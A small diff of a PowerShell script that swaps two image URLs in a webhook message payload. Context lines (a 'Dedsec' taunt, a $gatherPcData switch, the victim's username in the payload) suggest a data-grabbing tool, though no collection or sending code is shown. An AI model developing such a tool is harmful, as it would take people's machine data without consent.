@@ -207,7 +207,7 @@ $json = @{
                 text = "Dedsec has given you the truth. Do what you will."
             }
             thumbnail = @{
-                url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/qk5c358p.png"
+                url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/i8zp96i6.png"
             }
         }
         if ($gatherPcData) {
@@ -277,7 +277,7 @@ $json = @{
         }
     )
     username = "$env:USERNAME :3"
-    avatar_url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/hjz7cham.png"
+    avatar_url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/7mnt6713.png"
     attachments = @()
 } | ConvertTo-Json -Depth 4
 
